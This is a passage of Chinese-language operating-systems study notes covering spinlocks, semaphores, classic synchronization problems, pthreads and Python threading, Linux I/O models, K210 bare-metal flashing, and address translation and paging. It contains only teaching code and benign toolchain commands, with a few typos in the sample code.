<p>和上面类似的，<code>lock==1</code>表示资源被锁住了。</p>
<ul>
<li>如果lock之前是0，表示没有上锁，lock==expected，我们加上锁然后返回0。</li>
<li>如果lock之前是1，表示已经上锁，lock!=expected，我们返回1。</li>
</ul>
<p>上面的两个小例子虽然能做到MUX，但是这样不 satisfy the bounded-waiting requirement。为什么呢？因为可能出现两个进程相互交替然后其他进程无法执行的情况。来看下面这个例子：</p>
<pre><code class="language-c">boolean waiting[n];
int lock;
while (true) {
    waiting[i] = true;
    key = 1;
    while (waiting[i] &amp;&amp; key == 1)
    	key = compare_and_swap(&amp;lock,0,1);
    waiting[i] = false;		//我不等了，防止下次还执行到我。
    	/* critical section */
    j = (i + 1) % n;
    while ((j != i) &amp;&amp; !waiting[j])
    	j = (j + 1) % n;	//挑选下一个准备执行正在waiting的process
    if (j == i)	
    	lock = 0;	//没找到在等的，把锁释放了，不然就死锁了。
    else
    	waiting[j] = false;		//找到在等的，就让他不等啦，下一个执行的就是他。锁被传递给他。
    	/* remainder section */
}
</code></pre>
<p>这里的waiting表示已经准备执行了，<code>wating[i] = false</code>表示已经不再等待了。</p>
<p>key表示能否获得&quot;钥匙&quot;。就是能否使用资源，<code>key=0</code>表示可以。</p>
<p>注意到这里的扫描机制，每个等待的进程在<code>n</code>个进程之内必然被执行。如果<code>i</code>执行了之后，必须其他正在等待的都被执行了才能轮到<code>i</code>。<code>test_and_set</code>和<code>compare_and_swap</code>是类似的，也可以实现上面的功能。</p>
<p>注意到上面提到的三个例子都是<strong>busy waiting</strong>，会浪费很多的系统资源，尤其是很多进程的时候。我们叫他<strong>自旋锁（SpinLock）</strong>。</p>
<h2 id="mutex-互斥锁"><a class="header" href="#mutex-互斥锁">Mutex 互斥锁</a></h2>
<p>这是最简单的工具了。</p>
<p>每个Mutex有一个布尔变量available主要有两个操作（avilable=1表示可用，假设下面的操作是原子的）：
简单的可以这样实现，也是spinlock。</p>
<pre><code class="language-c">acquire(){
	while(compare_and_swap(avilable,1,0));
}
</code></pre>
<pre><code class="language-c">release(){
	compare_and_swap(available,0,1);
}
</code></pre>
<h2 id="semaphore-信号量"><a class="header" href="#semaphore-信号量">Semaphore 信号量</a></h2>
<p>semaphore比mutex功能更强大，主要也是两个操作，wait和signal。
wait() 等待一个被释放的锁然后占用。<code>S-&gt;value&gt;0</code>表示没有进程在等待资源，锁没有被占用。<code>S-&gt;value&lt;=0</code>表示被占用。下面这两个实现解决了忙等待问题。</p>
<pre><code class="language-c">wait(semaphore *S) {
    S-&gt;value--;	//等待的人+1
    if (S-&gt;value &lt; 0) {		//得不到锁
    	add this process to S-&gt;list;
    sleep();
	}
}//linux中这个函数叫down()
</code></pre>
<pre><code class="language-c">signal(semaphore *S) {
    S-&gt;value++;	//等待的人-1
    if (S-&gt;value &lt;= 0) {	//如果有在等的，就可以执行了。但是锁还是占用状态，相当于是把锁继承给他了
    	remove a process P from S-&gt;list;
    wakeup(P);
	}
}//linux中这个函数叫up()
</code></pre>
<p>需要注意的是，上面的两个操作应该是原子的。所以在Linux内核的代码中，有一个spin_lock来保证这些操作是原子的。spinlock还是被使用，但是里面的代码很短。</p>
<h2 id="priority-inversionstarvedeadlock"><a class="header" href="#priority-inversionstarvedeadlock">Priority Inversion、Starve、Deadlock</a></h2>
<p>Priority Inversion：一个低级别的进程占用了锁，让高级别进程无法执行。我们用Priority inheriance 解决这个问题。
Starve：虽然整体仍然在继续进行，但是有个倒霉的进程得不到执行。
Deadlock：因为不合理的设计让几个进程相互等待然后都得不到执行，停滞了。</p>
<h2 id="经典同步问题"><a class="header" href="#经典同步问题">经典同步问题</a></h2>
<h3 id="bounded-buffer-problemproducer-consumer-problem"><a class="header" href="#bounded-buffer-problemproducer-consumer-problem">Bounded Buffer Problem/Producer-Consumer Problem</a></h3>
<p>缓冲池有n个buffer，Producer为Consumer生产满的buffer，Consumer为Producer生产空的buffer。他们共享数据结构如下，我们要实现的目标是他们不能同时使用buffer，Producer必须在不full的时候才能生产，Consumer必须在不empty的时候才能消耗。</p>
<pre><code class="language-c">int n;
semaphore mutex=1;
semaphore empty=n;
semaphore full=0;
</code></pre>
<p>解决方案如下：</p>
<pre><code class="language-c">//Producer
do {
    //item produce
	wait(empty);
	wait(mutex);	//注意这里的顺序是不能反的。
	
    //add item to buffer
    
    signal(mutex);
    signal(full);
while (1);
</code></pre>
<pre><code class="language-c">//Consumer
do{
    wait(full);
    wait(mutex);
    
    //remove item from buffer
    signal(mutex);
    signal(empty);
    
    //use item
}while(1)
</code></pre>
<h3 id="readers-writers-problem"><a class="header" href="#readers-writers-problem">Readers-Writers Problem</a></h3>
<p>可以很多读者一起读，但是只能有一个作者在写。读写互斥。使用数据结构如下</p>
<pre><code class="language-c">semaphore rw_mutex=1;
semaphore mutex=1;
int read_count;
</code></pre>
<p>解决方案如下：</p>
<pre><code class="language-c">//writer
do{
	wait(rw_mutex);
	/* writing */
	signal(re_mutex);
}
</code></pre>
<pre><code class="language-c">//reader
do{
	wait(mutex);
	read_count++;
	if (read_count==1)
		wait(rw_mutex);		//第一个读者应该把读写锁置上
   	signal(mutex);	//mutex的作用是为了让这一段是原子操作
    
    wait(mutex);
    read_count--;
    if (read_count==0)
        signal(re_mutex);
    signal(mutex);
}
</code></pre>
<p>如果不停的有读者在读，writer就starve了。这是reader优先的做法。</p>
<p>另一个是writer优先的做法，当有writer在等待的时候，新来的读者被suspend了。</p>
<h3 id="dining-philosophers-problem"><a class="header" href="#dining-philosophers-problem">Dining-Philosophers Problem</a></h3>
<p><img src="Basic/OS/../images/1610355365213.png" alt="" />
这是一个有趣的问题，一个解决方法是单号哲学家得先拿到左边的筷子才能拿右边的筷子，双号要先拿到右边的筷子才能拿左边的筷子。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-thread"><a class="header" href="#os-thread">OS-Thread</a></h1>
<p>参考链接：https://computing.llnl.gov/tutorials/pthreads/。</p>
<h2 id="linux-pthread"><a class="header" href="#linux-pthread">Linux-pthread</a></h2>
<p>Linux中提供一个<code>clone()</code>函数，他和fork类似，但是可以选择共享父进程的一些内存空间（没错，这和创建线程很像；事实上，在Linux中这就是线程）</p>
<pre><code class="language-c">int clone(int (*fn)(void *), void *child_stack,int flags, void *arg, ...)
//我们创建一个子进程调用fn(arg)函数；当fn函数return的时候，子进程terminate，exit code = return value，flag指定了一些空间共享的属性和termination signal sent to parent
</code></pre>
<p>Pthreads允许程序创建、杀死、回收线程，对等线程安全的共享数据，通知对等线程系统状态的变化。</p>
<p>API：（更详细的可以查看Manual手册）</p>
<pre><code class="language-c">#include &lt;pthread.h&gt;
#include &lt;sys/syscall.h&gt;
//创建线程
int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);//创建线程
pthread_t pthread_self(void);	//返回当前线程ID，但这个不是TID，是POSIX定义的。
syscall(SYS_gettid);	//返回线程TID的一种方法，在编程中TID没什么用啦
//终止线程
当thread routine 执行完毕后会 inplicit terminate
pthread_exit();		//explicit terminate 当前线程
pthread_cancel(tid);	//向thread提出一个终止的请求，但是实际的终止取决于目标进程如何处理这个请求
如果有某个thread调用了 exit()函数，那么该process中所有的threads都会被终止。注意，leading thread执行完了会隐式的调用 exit().
//回收已经终止的线程资源
int pthread_join(pthread_t thread, void **retval);	//这个是block的，会等待回收的完成
</code></pre>
<p>例程：</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;

int counter = 0; //全局变量，被所有进程共享
static int loops = 1e6;
pthread_mutex_t pmutex = PTHREAD_MUTEX_INITIALIZER; 

void *worker(void *arg) {
    int i;
    printf(&quot;%s: begin\n&quot;, (char*)arg);
    for(i = 0; i &lt; loops; i++) {
	pthread_mutex_lock(&amp;pmutex);
        counter++;
	pthread_mutex_unlock(&amp;pmutex);
    }
    printf(&quot;%s: done\n&quot;, (char *)arg);
    return NULL;
}

int main() {
    pthread_t p1, p2;

    printf(&quot;main: begin (counter =  %d)\n&quot;, counter);
    pthread_create(&amp;p1, NULL, worker, &quot;A&quot;);
    pthread_create(&amp;p2, NULL, worker, &quot;B&quot;);
    pthread_join(p1, NULL);
    pthread_join(p2, NULL);
    printf(&quot;main: done with both (counter : %d)\n&quot;, counter);
    return 0;
}

</code></pre>
<h2 id="python的多线程"><a class="header" href="#python的多线程">Python的多线程</a></h2>
<p>Python中有挺多支持并行的库，这里介绍基于线程的并行库threading。还有一个低级的库thread，但是一般我们不使用，threading是对Thread的封装。Python的多线程不支持多核并行。</p>
<pre><code class="language-python">import threading
threading.Thread(group=None, target=None, name=None, args=(), kwargs={}, *, daemon=None)	//创建一个进程，构造函数。target 是用于 run() 方法调用的可调用对象。arg和kwargs是传递给target的参数
t = threading.Thread(target=hello)
t.setDaemon(True)	//将t设置为守护线程,在start之前设置
t.start()		//开始执行
t.join()		//等待线程结束

e=threading.Event()	//创建一个事件对象，可以用于进程间的简单通信
e.set()	e.clear()	//把Event内部的标志位置true/false
e.wait()	//block until flag==true

timer = threading.Timer(interval=1,function=hello)
timer.start()	//定时器，经过interval秒之后执行function

lock=threading.Lock()	//创建一个锁
lock.acquire()		//开始锁
lock.release()		//释放锁，开始和释放之间的操作是原子化的。
</code></pre>
<h2 id="java的多线程"><a class="header" href="#java的多线程">Java的多线程</a></h2>
<p>学艺不精，略了。。</p>
<h2 id="线程池"><a class="header" href="#线程池">线程池</a></h2>
<p>大意：</p>
<ul>
<li>首先我们创建N个线程，加到池中等待工作。</li>
<li>当server收到请求的时候，唤醒一个可用线程，将服务传递给他。</li>
<li>完成了服务的线程再次回到池中。</li>
<li>如果池内没有可用线程，server等待直到出现可用线程为之。</li>
</ul>
<h2 id="kernel-thread--user-thread可能不对"><a class="header" href="#kernel-thread--user-thread可能不对">kernel thread &amp; user thread(可能不对！！)</a></h2>
<p>[!] 误区kernel thread在这里指的不是运行在kernel mode下的thread!
<a href="https://stackoverflow.com/questions/15983872/difference-between-user-level-and-kernel-supported-threads#:~:text=A%20User%20thread%20is%20one,with%20a%20user%2Dspace%20process.">解释</a>   <a href="https://www.geeksforgeeks.org/difference-between-user-level-thread-and-kernel-level-thread/">二者优劣</a> <a href="https://www.tutorialspoint.com/operating_system/os_multi_threading.htm">一篇好文</a></p>
<p>大致的理解是，对于操作系统来说，他关注的是native thread，或者说他只知道native thread。</p>
<p>我们编写的多线程程序，可以被翻译成由一个kernel thread对应一个user thread（多对一），在这种情况下Kernel帮助我们调度thread。这样子可以支持多核并行。</p>
<p>也可以被翻译成其实其实只有一个kernel thread，但是有多个user thread（一对一）。这样子的话，我们需要自己调度Thread。优点是context switch可以更加高效，问题是一个thread如果block了整个process也就block了。</p>
<p>但是这个理解的话，那和不同的model和操作系统有什么关系？感觉都是库函数的原因？</p>
<p>在Linux中，thread也叫LWP，light weight process，也用task_struct管理thread。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux中的io模型"><a class="header" href="#linux中的io模型">Linux中的I/O模型</a></h1>
<h2 id="everything-is-file"><a class="header" href="#everything-is-file">Everything is file</a></h2>
<p>linux/unix下的哲学核心思想是<strong>Everything is file</strong>。File 只是一个表现形式，其本质有两点：</p>
<ul>
<li>统一的名字空间 (unified namespace)：表现形式是文件系统 (filesystem) 的路径；</li>
<li>统一的访问接口 (unified interface)：表现形式是 read/write 等标准函数。</li>
</ul>
<h3 id="统一的访问接口"><a class="header" href="#统一的访问接口">统一的访问接口</a></h3>
<p>File就是字节流。对于字节流这种形式你可以：</p>
<ul>
<li>
<p><a href="https://man7.org/linux/man-pages/man2/open.2.html"><code>int open(const char *pathname, int flags, mode_t mode);</code></a> 打开文件</p>
</li>
<li>
<p><a href="https://man7.org/linux/man-pages/man2/read.2.html"><code>ssize_t read(int fd, void *buf, size_t count);</code></a> 读</p>
</li>
<li>
<p>[<code>ssize_t write(int fd, const void *buf, size_t count);</code>](https://man 7.org/linux/man-pages/man2/write.2.html) 写</p>
</li>
<li>
<p><a href="https://man7.org/linux/man-pages/man2/lseek.2.html"><code> off_t lseek(int fd, off_t offset, int whence);</code></a> 改变偏移</p>
</li>
<li>
<p><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html"><code>int fcntl(int fd, int cmd, ... /* arg */ );</code></a> 操作文件描述符</p>
</li>
<li>
<p><a href="https://man7.org/linux/man-pages/man2/close.2.html"><code>int close(int fd);</code></a> 关闭文件描述符</p>
</li>
<li>
<p>还有很多别的系统调用。</p>
</li>
</ul>
<p>最后请注意，当所有的文件提供一致的 API 时，一些特殊类型的设备可能会不支持某些操作。举个很明显的例子，你不可以在鼠标设备上使用 <code>lseek</code>命令，或在 CD-ROM 设备上使用 <code>write</code>命令（假设你的 CD 是只读的）。</p>
<h3 id="统一的名字空间"><a class="header" href="#统一的名字空间">统一的名字空间</a></h3>
<p>下面的这些资源，并不是真正的存在硬盘上的文件，而是伪文件系统：</p>
<ul>
<li><strong>procfs</strong>(<code>/proc</code>)：proc 文件系统包含一个特殊文件层，这个文件层可以用来查询或控制运行中的进程，或通过标准文件入口（大部分基于文本）一窥内核内部文件。</li>
<li><strong>devfs</strong>(<code>/dev</code>or <code>/devices</code>)：devfs 将所有系统中的设备以动态文件系统命名空间呈现。devfs 也可以通过内核设备驱动直接管理这些命名空间和接口，以此来提供智能的设备管理 —— 包括设备入口注册/反注册。</li>
<li><strong>tmpfs</strong>(<code>/tmp</code>)：临时文件系统的内容会在重启时消失，tmpfs 是为速度和效率而设计的，具有动态文件系统大小、用以空间清理的显式回退等特性。</li>
<li><strong>portalfs</strong>(<code>/p</code>)：通过 BSD 门户文件系统，你可以将一个服务器进程连接到文件系统通用命名空间上。这样可以提供明确的通过文件系统对网络服务的存取过程。比如一个 App 可以通过打开一个合规的文件 <code>/p/tcp/ph7spot.com/smtp</code>来和 <code>ph7spot.com</code>上的 SMTP 服务器进行交互。门户文件系统很神奇，因为它在文件系统中可以提供套接字语义，还可以被 UNIX 系统工具传输和使用（比如：<code>cat</code>, <code>grep</code>, <code>awk</code>等等）—— 甚至可以通过 shell 来使用！</li>
<li><strong>ctfs</strong>(<code>/system/contract</code>)：协定文件系统作为一个以文件为基础的接口的 Solaris 协定子系统。Solaris 协定为各种各样的事件和失败情况定义了一个进程或进程组的表现形式 —— 比如，进程停止时重启。 Solaris 协定为诸如群集故障转移软件，批处理排队系统和网格计算引擎等环境中的软件管理和监视提供了非常高级的功能。</li>
</ul>
<h2 id="io-model"><a class="header" href="#io-model">IO Model</a></h2>
<p>我们知道Linux中一切皆文件，那么怎么操作文件呢？Linux环境中主要提供了五种不同的IO模型，分别是阻塞式IO、非阻塞式IO、IO多路复用、信号驱动式IO和异步IO。</p>
<p><img src="Basic/OS/../images/1691ec1919cbe0actplv-t2oaga2asx-watermark.awebp" alt="io-diff" /></p>
<p>我们来看看<code>open()</code>的<code>flag</code>参数中，是怎么体现这些IO模型的</p>
<blockquote>
<p>O_ASYNC: 
Enable <strong>signal-driven I/O</strong>: generate a signal (SIGIO by default, but this can be changed via fcntl(2)) when input or output becomes possible on this file descriptor.  This feature is available only for terminals, pseudoterminals, sockets, and (since Linux 2.6) pipes and FIFOs.  See fcntl(2) for further details.  See also BUGS, below.</p>
<p>O_DSYNC: 
Write operations on the file will complete according to the requirements of <strong>synchronized I/O data integrity completion.</strong> By the time write(2) (and similar) return, the output data has been transferred to the underlying hardware, along with any file metadata that would be required to retrieve that data (i.e., as though each write(2) was followed by a call to fdatasync(2)).  See NOTES below.</p>
<p>O_SYNC:
Write operations on the file will complete according to  the requirements of <strong>synchronized I/O file integrity completion</strong> (by contrast with the synchronized I/O data integrity completion provided by O_DSYNC.)
By the time write(2) (or similar) returns, the output data and associated file metadata have been transferred to the underlying hardware (i.e., as though each write(2) was followed by a call to fsync(2)).  See NOTES below.</p>
<p>O_NONBLOCK or O_NDELAY:
When possible, the file is opened in nonblocking mode. Neither the open() nor any subsequent I/O operations on the file descriptor which is returned will cause the calling process to wait.
Note that the setting of this flag has no effect on the operation of poll(2), select(2), epoll(7), and similar, since those interfaces merely inform the caller about whether a file descriptor is &quot;ready&quot;, meaning that an I/O operation performed on the file descriptor with the  O_NONBLOCK flag clear would not block.
Note that this flag has no effect for regular files and block devices; that is, I/O operations will (briefly) block when device activity is required, regardless of whether O_NONBLOCK is set.  Since O_NONBLOCK semantics might eventually be implemented, applications should not depend upon blocking behavior when specifying this flag for regular files and block devices.
For the handling of FIFOs (named pipes), see also fifo(7).
For a discussion of the effect of O_NONBLOCK in conjunction with mandatory file locks and with file leases, see fcntl(2).</p>
</blockquote>
<p><code>O_SYNC</code>和<code>O_DSYNC</code>差别仅在于SYNC要求write完成之后data和metadata都已经改变，而DSYNC只要求data已经改变。POSIX标准还规定了RSYNC，但是这个在Linux中没有实现。</p>
<p><code>O_ASYNC</code>和<code>O_NONBLOCK</code>看起来有点像。区别在于，ASYNC在读写就绪之后会产生一个Signal（通常是SIGIO），如果要handle这个SIGNAL，程序的控制流就会很乱。而NONBLOCK并不会告诉你读写的就绪与否，你可以自己使用<code>poll</code>和检查。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-在k210运行裸机程序"><a class="header" href="#os-在k210运行裸机程序">OS-在K210运行裸机程序</a></h1>
<h2 id="背景知识"><a class="header" href="#背景知识">背景知识</a></h2>
<p><strong>串口</strong>：串行接口简称串口，也称串行通信接口或串行通讯接口（通常指COM接口），是采用串行通信方式的扩展接口。串行接口 （Serial Interface）是指数据一位一位地顺序传送。其特点是通信线路简单，只要一对传输线就可以实现双向通信（可以直接利用电话线作为传输线），从而大大降低了成本，特别适用于远距离通信，但传送速度较慢。
<strong>固件</strong>：firmware一般存储于设备中的电可擦除只读存储器EEPROM(Electrically Erasable Programmable ROM)或FLASH芯片中，一般可由用户通过特定的刷新程序进行升级的程序。一般来说，担任着一个数码产品最基础、最底层工作的软件才可以称之为固件，比如计算机主板上的基本输入/输出系统BIOS（Basic Input/output System)，在以前其实更多的专业人士叫它固件。对于我们的实验，我们可以认为我们需要得到一个<strong>纯二进制文件</strong>，烧到flask中作为firmware。</p>
<h2 id="环境搭建"><a class="header" href="#环境搭建">环境搭建</a></h2>
<p>可以直接使用我的docker Image
<code>docker run -it --device ttyUSB0 python</code></p>
<p>工具：
|工具|安装|说明|
|-|-|-|
|qemu-system-riscv64||riscv硬件模拟器|
|riscv-GNU工具链|https://github.com/riscv/riscv-gnu-toolchain|一套完整的可以生成riscv平台可执行文件的跨平台工具链|
|kflash|<code>pip3 install kflash</code>|用来把firmware烧进去的|
|(sudo)minicom|<code>sudo apt-get install minicom</code>|串口工具，方便调试|</p>
<p>编译出来的ELF文件，如何到板子上执行呢？当然，并不是随便一个ELF就可以执行了。
<code>objcopy KERNEL_ELF --strip-all -O binary os_firmware.bin</code>
我们把ELF文件的<code>.text</code>,<code>.data</code>,<code>.rodata</code>都复制到了os_firmware.bin中。更准确的说，是纯二进制数据的复制。其他段的信息被丢弃。
<code>kflash -b 3000000 -B dan -t os_firmware.bin -p /dev/ttyUSB0 # Open a Serial Terminal After Finish</code></p>
<h2 id="k210正确运行"><a class="header" href="#k210正确运行">K210正确运行</a></h2>
<p>从一个及其简单的角度看，程序的运行无非就是从内存中取指令-CPU执行指令的简单过程。
CPU能执行什么指令？我们只需要交给编译器来帮我们翻译就行了。不过具体的CPU可能不支持某些特殊的指令或支持某些特殊的指令。
内存的布局也是不同的板子不同的。<a href="https://github.com/laanwj/k210-sdk-stuff/blob/master/doc/memory_map.md">K210的内存布局</a>，我们能用的RAM从<code>0x80000000~0x807fffff</code>。然后一些外设的映射地址可以参考链接的说明。</p>
<p>启动过程：</p>
<blockquote>
<p>ROMCPU (0x00001000) seems to be the initial boot vector, from there, there's a jump to the beginning of the main ROM (0x88000000). This ROM implements loading of the flash to memory at 0x80000000 and jumping to it, as well as &quot;ISP&quot; mode for directly uploading a program from the serial port (this is used by kflash.py for flashing).</p>
</blockquote>
<p>也就是说，我们的程序从0x80000000开始执行。我们代码的第一条指令从这里开始。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-地址空间一"><a class="header" href="#os-地址空间一">OS-地址空间(一)</a></h1>
<p>参考链接：</p>
<ul>
<li><a href="https://blog.csdn.net/chen1540524015/article/details/74075397">segement register, segement selector, segement descriptor</a></li>
<li>《Linux源码剖析》</li>
<li>《CSAPP》 这本书讲的是Flat memory model，没有segment这么一说。</li>
<li><a href="https://naotu.baidu.com/file/6fa404fe130b4f2e616c312a7101eeab">思维导图</a>，乱的不行。</li>
<li><a href="https://blog.csdn.net/jinking01/article/details/105831888/">对LDT和GDT的讲解</a></li>
</ul>
<h2 id="基本概念-1"><a class="header" href="#基本概念-1">基本概念</a></h2>
<p><strong>Logical address</strong> – generated by the CPU; also referred to as virtual address
**Physical address <strong>– address seen by the memory unit
我们（CPU）用的都是Logical，最终要被翻译成（MMU和操作系统合作）Physical给内存用。
我们要讲述的，就是</strong>Logical address =&gt;Physical address ** ，下面的Linear Address不过是一个中间为了方便说明的东西。</p>
<p>虚拟地址=逻辑地址、线性地址、物理地址。</p>
<h3 id="from-logical-addressvirtual-address-to-linear-address"><a class="header" href="#from-logical-addressvirtual-address-to-linear-address">From Logical address(Virtual address) to Linear address</a></h3>
<p>我们平时用的都是<strong>Virtual addresses</strong> 。
在Intel80386中逻辑地址包括一个16-bit <strong>selector</strong> 和一个 32-bit <strong>offset</strong>（段地址和偏移地址组成，注意这个和8086CPU是完全不同的）
We save <em>selector and some information of description</em> in <strong>segment register</strong>(CS, DS, ES, SS, FS or GS). If the selector is not saved in segment register, we load the information of <strong>description</strong> from GDT or LDT.
Then we check <em>limit and privilege (some information of descriptor)</em>. 我们检查offset 是否在段的limit内，以及当前特权及是否能符合该段的特权级限制。
If so , <strong>Linear addr</strong> = <strong>base addr</strong> + <strong>offset</strong>
作为程序员，和我们打交道的从来都只是逻辑地址。</p>
<ul>
<li><strong>GDT &amp; LDT</strong>
In Selector, <strong>TI</strong> tell us to find GDT or LDT; <strong>Index</strong> tell us where in XDT to find Descriptor.
GDT, Global Descriptor Table;
LDT, Local Descriptor Table;</li>
</ul>
<h2 id="from-linear-address-to-physical-address"><a class="header" href="#from-linear-address-to-physical-address">From Linear address to Physical address</a></h2>
<p>If paging(分页机制) is disabled linear address = physical  address. 
否则的话，我们之前的产生的线性地址还要通过<strong>页表</strong>寻址真正的物理地址。
我们注意到每一个进程都有一个Logical Address，所以每个进程都有一个<strong>Page Table</strong>。
可以注意到会有多个 Linear address（1 byte addressable）映射到一个 Page（通常4Kb）。给定一个Linear address，部分位（Virtual Page Number）确定一个Virtual Page，剩下的位是VPO（Virtual Page Offset）
<img src="Basic/OS/../images/1603005345168.png" alt="" /></p>
<p>不难发现这个可以很轻松的拓展到多级页表，节省内存。上一个Page Table Entry作为下一层页表的Base Address，直到最后一个Page Table Entry指向物理地址。
<img src="Basic/OS/../images/1603005457197.png" alt="" /></p>
<p><strong>通过Linear address我们所引导一个Page Table Entry。根据PTE，我们就能寻到Physical Address了。</strong>
<strong>Physical Address = PPN ~ PPO</strong></p>
<h2 id="paging-1"><a class="header" href="#paging-1">Paging</a></h2>
<p>操作系统维护一个Page Table（页表），让Virtual Page映射到Physical Page。（有些地方，我们把<strong>Virtual Page称为Page</strong>，<strong>Physical Page称为Frame</strong>）</p>
<p>页表是一个PTE(Page Table Entry)数组，
PTE的主要作用就是Virtual Page和Physical Page的对应，一个PTE包括：
<img src="Basic/OS/../images/1603007197739.png" alt="" /></p>
<ul>
<li>PPN：Physical Page Number</li>
<li>VPO/PPO：Physical Page Offset，由于Virtual Page和Physical Page一样的大小，所以PPO = VPO</li>
<li>valid bit：表示该Page是否在物理内存中，如果valid bit 是0的话那PPN也没有意义了</li>
<li>一些权限管理的bit</li>
<li></li>
</ul>
<p>要注意的是，我们寻到一个VPN之后，不代表我们就能用他了。因为我们只能用Main memory里的东西，但是它可能在 secondary storage，这种情况就叫缺页（Page fault），这个时候就会产生缺页异常，然后操作系统要通过异常处理把它Page转移到Physical memory中。</p>
<h2 id="how-we-addressing"><a class="header" href="#how-we-addressing">How we addressing</a></h2>
<p><img src="Basic/OS/../images/1603006866206.png" alt="" /></p>
<center>左边的一小块就是Page，右边的一小块就是Frame</center>
<p><img src="Basic/OS/../images/1603017418853.png" alt="" />
每个Process都有自己的Virtual address space。最终他们都映射到Physical address space中的一个地方。中间的过程就是本篇文章讨论的。
<strong>另外，其实段+偏移这种方式已经被淘汰了（但是Intel向前兼容所以还存在），像ARM和RISCV都已经没有段寄存那么一说了。在这种情况下逻辑地址的产生更为方便。</strong></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-操作系统"><a class="header" href="#os-操作系统">OS-操作系统</a></h1>
<!-- vscode-markdown-toc -->
<pre><code>* 1. [Recommand books](#Recommandbooks)
</code></pre>
<ul>
<li>
<ol>
<li><a href="Basic/OS/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.html#Outline">Outline</a></li>
</ol>
</li>
<li>
<ol start="2">
<li><a href="Basic/OS/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.html#Process">Process</a></li>
</ol>
<ul>
<li>2.1. <a href="Basic/OS/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.html#ProcessConcept">Process Concept</a></li>
<li>2.2. <a href="Basic/OS/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.html#ProcessState">Process State：</a></li>
<li>2.3. <a href="Basic/OS/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.html#ProcessControlBlock">Process Control Block</a></li>
<li>2.4. <a href="Basic/OS/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.html#Thread">Thread</a></li>
<li>2.5. <a href="Basic/OS/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.html#ProcessScheduling">Process Scheduling</a></li>
</ul>
</li>
</ul>
<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->
<p><a href="https://wenboshen.org/">老师的主页</a>
邮箱：shenwenbo@zju.edu.cn
Lab 9:50-11:25
TA:Ade Zhuang</p>
<p>考试重点：进程状态图，任务调度图</p>
<h3 id="1-recommand-books"><a class="header" href="#1-recommand-books">1. <a name='Recommandbooks'></a>Recommand books</a></h3>
<p>《CSAPP》《边干边学》《操作系统概念》《Commputer orgnization and design》
《Linux内核完全剖析》</p>
<h2 id="1-outline"><a class="header" href="#1-outline">1. <a name='Outline'></a>Outline</a></h2>
<ul>
<li>System Call：</li>
</ul>
<p>参考CSAPP
主要分类：</p>
<ol>
<li>进程控制process control</li>
<li>文件管理file management</li>
<li>设备管理device management</li>
<li>信息维护information maintenance </li>
<li>通信communication</li>
<li>保护protection</li>
</ol>
<p>在64位常见的格式</p>
<pre><code class="language-asm">mov number,eax
syscall
</code></pre>
<p>请查看不同架构中的Linux的syscall文件，linux/arch/riscv/kernel/syscall_table.c。
然而里头的内容都在需要include的文件里。那么我们使用cpp文件预处理。
但是有一个问题就是需要更改cpp寻找头文件的默认路径。</p>
<p>&quot;ARM32
&quot;RISC-V(32 bit)
&quot;RISC-V(64 bit)
&quot;X86(32 bit)
&quot;X86_64</p>
<ul>
<li>LInker and Loader，ELF文件</li>
</ul>
<p><code>objdump -h/-x/-s 一个ELF文件</code>或<code>readelf</code>查看ELF文件节
这一部分阅读CSAPP很有帮助。
有一些问题：（1）.plt	.plt.got	.got.plt	.got
（2）&lt;_start&gt;是程序的起点，那么他是怎么实现的呢？查看源代码。</p>
<p>cat /proc/pid/maps
判断里头的节。里面的动态链接库也是ELF文件，也有类似的节。
---p是什么呢？不可读不可写不可执行？
参考链接：https://unix.stackexchange.com/questions/226283/shared-library-mappings-in-proc-pid-maps;https://unix.stackexchange.com/questions/353676/what-is-the-purpose-of-seemingly-unusable-memory-mappings-in-linux/353685#353685	大致理解是，通过这一段gap，让前面可共享的代码段和后面可写的数据段不在同一page。但是中间差了128Kb，似乎不是一个page的大小？</p>
<ul>
<li>
<p>目标和策略分离</p>
</li>
<li>
<p>Main OS services（以Linux为例）
参考《操作系统概念》</p>
</li>
</ul>
<ol>
<li>Process Management
deamon（守护进程）：ps 末尾是d。
查看进程信息，在/proc文件</li>
<li>Memory Management
我们需要把要用东西装到Memory
OS</li>
<li>Storage Management</li>
<li>IO Management
Handle IO </li>
<li>Protection and Security</li>
</ol>
<ul>
<li>
<p>关于hello_world
参考链接：&quot;http://osteras.info/personal/2013/10/11/hello-world-analysis.html&quot;；
https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/not-cancel.h.html#__write_nocancel；
&quot;https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/write_nocancel.c.html#__write_nocancel</p>
<p>ldd:打印程序或者库文件所依赖的共享库列表
nm:显示二进制目标文件的符号表</p>
</li>
<li>
<p>操作系统架构</p>
<p>Linux内核架构：https://makelinux.github.io/kernel/map/</p>
<p>参考《操作系统概念》</p>
</li>
</ul>
<h2 id="2-process"><a class="header" href="#2-process">2. <a name='Process'></a>Process</a></h2>
<h3 id="21-process-concept"><a class="header" href="#21-process-concept">2.1. <a name='ProcessConcept'></a>Process Concept</a></h3>
<p>Process = code section+ program counter + register + stack + data section + heap
进程，是组织资源的最小单元。可以简单的认为process 是 program in execution.
在/proc/pid中查看进程信息。Memory的layout可以查看maps文件。如下图所示
<img src="Basic/OS/../images/1602225394138.png" alt="" />
可以看出，上面是程序部分。text section存存放代码，rodata只读数据，data存放数据。
下面是heap，顶上是stack，中间是用到的链接库。
当stack增长到lib的代码的时候，就会stackoverflow。</p>
